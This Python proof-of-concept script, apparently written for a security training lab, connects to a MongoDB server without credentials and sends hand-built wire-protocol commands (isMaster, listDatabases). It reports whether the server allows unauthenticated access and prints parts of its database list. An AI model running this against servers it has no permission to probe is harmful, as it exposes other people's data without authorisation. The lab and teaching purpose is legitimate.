#!/usr/bin/env python3
"""MongoDB No-Auth Access PoC

Connects to MongoDB without authentication and dumps database info.
Educational proof-of-concept for KZ-Sploitable lab.
"""

import sys
import socket
import struct


def build_ismaster():
    """Build a minimal isMaster command for MongoDB wire protocol."""
    doc = b"\x10ismaster\x00\x01\x00\x00\x00\x00"  # {ismaster: 1}
    section = b"\x00" + doc

    flags = struct.pack("<I", 0)
    body = flags + section

    msg_len = 16 + 4 + len(body)  # header(16) + flagBits(4) + body
    header = struct.pack("<iiii", msg_len, 1, 0, 2013)
    return header + body


def build_list_databases():
    """Build listDatabases command."""
    doc = b"\x10listDatabases\x00\x01\x00\x00\x00\x02$db\x00\x06\x00\x00\x00admin\x00\x00"
    section = b"\x00" + doc

    flags = struct.pack("<I", 0)
    body = flags + section

    msg_len = 16 + 4 + len(body)
    header = struct.pack("<iiii", msg_len, 2, 0, 2013)
    return header + body


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "kz-mongodb"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 27017

    print(f"[*] Target: {host}:{port}")
    print(f"[*] Type: No-Authentication Access")
    print()

    print("[+] Attempting TCP connection...")

    try:
        sock = socket.create_connection((host, port), timeout=10)
        print(f"[+] Connected to {host}:{port}")
        print()

        print("[+] Sending isMaster command...")
        sock.sendall(build_ismaster())

        response = sock.recv(4096)
        if response:
            print(f"[+] Received {len(response)} bytes")
            if b"ismaster" in response.lower() if isinstance(response, bytes) else True:
                print("[+] SUCCESS: MongoDB accepted unauthenticated connection")
                print("[+] Server responded to isMaster -- no auth required")
            else:
                print(f"[+] Raw response (hex): {response[:64].hex()}")
        else:
            print("[-] No response received")

        print()
        print("[+] Attempting to list databases...")
        sock.sendall(build_list_databases())
        response2 = sock.recv(8192)
        if response2:
            print(f"[+] Received {len(response2)} bytes for listDatabases")
            ascii_parts = response2.decode("ascii", errors="replace")
            readable = "".join(c if c.isprintable() else "." for c in ascii_parts)
            print(f"[+] Decoded fragments: {readable[:300]}")

        sock.close()

    except socket.timeout:
        print(f"[!] Connection timed out to {host}:{port}")
    except ConnectionRefusedError:
        print(f"[!] Connection refused at {host}:{port}")
        print(f"[*] Ensure the MongoDB container is running")
    except Exception as e:
        print(f"[!] Error: {e}")

    print()
    print("[*] PoC execution complete")


if __name__ == "__main__":
    main()
